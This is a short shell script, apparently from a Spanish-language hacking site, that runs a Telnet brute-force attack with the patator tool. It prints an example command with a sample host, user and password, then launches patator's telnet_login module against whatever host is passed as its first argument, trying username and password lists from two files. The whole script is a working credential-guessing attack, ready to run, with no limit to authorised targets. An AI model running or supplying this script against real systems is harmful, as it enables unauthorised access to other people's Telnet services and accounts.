echo
echo "Fuerza bruta Telnet, con patator "
echo
echo "https://github.com/lanjelot/patator"
echo "patator telnet_login host=1.1.1.1 user=antonio password=Passwd01"
echo "hackingyseguridad.com 2024"
patator telnet_login host=$1 inputs='FILE0\nFILE1' 0=usuarios0.txt 1=claves0.txt
